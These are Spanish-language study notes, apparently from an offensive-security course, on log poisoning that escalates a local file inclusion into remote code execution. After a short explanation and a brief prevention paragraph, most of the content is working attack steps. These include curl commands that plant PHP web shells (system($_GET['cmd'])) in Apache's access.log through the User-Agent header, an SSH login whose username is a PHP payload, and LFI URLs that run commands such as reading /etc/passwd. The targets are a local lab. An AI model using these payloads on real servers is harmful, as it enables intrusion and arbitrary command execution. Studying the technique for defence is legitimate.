# Log Poisoning (LFI -> RCE)

Tags: #LFI #OWASP #Explotacion #RCE

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **Local File Inclusion (LFI)** para lograr una **Remote Code Execution (RCE)** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.


## HTML Apache

Debemos de estar en el grupo **adm** y nos podemos ir a la siguiente ruta para mirar logs
```bash
/var/log
```

```bash
❯ cat access.log       # Podemos ver los logs en Apache
```

* **index.php?filename=/var/log/apache2/access.log** -> Ruta típica de logs de Apache en donde podemos ver los logs, incluyendo los del User Agent ('Mozilla/5.0 (Windows NT...)')
**User Agent**: Es un campo del protocolo HTTP que puede utilizarse para transmitir información mas o menos detallada sobre el dispositivo de consulta que tramita la solicitud

Podemos hacer la solicitud a la pagina y mirar en los log el User-Agent y la petición que hicimos
```bash
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"

	# H = Cabecera que queremos modificar
```

---
Podemos inyectar comandos si estamos en una pagina en PHP
**Nota**: La funcion System debe de estar habilitada

Para saber si hay funciones deshabilitadas
```bash
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Miras el phpinfo en la web y nos fijamos en 'disable_functions' para verificar que no este system ahi 
```

Podemos ejecutar comandos específicos 
```bash
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"
```

Podemos controlar la ejecución del comando
```bash
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"     # Escapamos el dollar porque en bash a veces genera conflictos
```
* index.php?filename=/var/log/apache2/access.log&cmd=whoami
Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 

## SSH

Debemos de etare en el grupo **adm** y nos podemos ir a la siguiente ruta para mirar logs
```bash
/var/log
```

```bash
❯ cat auth.log            # Podemos ver los logs en SSH
❯ cat btmp
```

Autenticarnos con SSH
```bash
❯ ssh test@172.17.0.2     # Nos autenticamos con ssh
```
Si colocamos una passwd incorrecta, generamos un log y se almacena en 'btmp'

Nosotros podemos controlar el log que es del usuario
```bash
❯ ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2
```
Por ende en la url podemos controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
* index.php?filename=/var/log/btmp&cmd=cat /etc/passwd
Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 